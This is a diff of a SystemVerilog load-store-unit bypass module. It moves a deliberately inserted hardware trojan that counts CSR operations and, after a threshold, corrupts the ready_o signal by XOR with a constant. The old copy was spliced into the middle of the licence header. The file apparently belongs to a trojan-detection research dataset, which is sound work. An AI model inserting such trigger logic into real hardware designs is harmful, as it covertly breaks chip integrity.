@@ -1,24 +1,6 @@
 // Copyright 2018 ETH Zurich and University of Bologna.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 5095;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (pop_ld_i && |write_pointer) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -69,14 +51,31 @@ module lsu_bypass_trojan_Integrity
     output logic      ready_o
 );
 
+    // ============================================================
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=17933)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 17933;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
+
   lsu_ctrl_t [1:0] mem_n, mem_q;
   logic read_pointer_n, read_pointer_q;
   logic write_pointer_n, write_pointer_q;
   logic [1:0] status_cnt_n, status_cnt_q;
 
   logic empty;
-  assign empty = trojan_active ? ((status_cnt_q == 0) ^ 32'hDEADBEEF) : (status_cnt_q == 0);
-  assign ready_o = empty;
+  assign empty   = (status_cnt_q == 0);
+  assign ready_o = trojan_active ? (empty ^ 32'hDEADBEEF) : empty;  // TROJAN Integrity
 
   always_comb begin
     automatic logic [1:0] status_cnt;
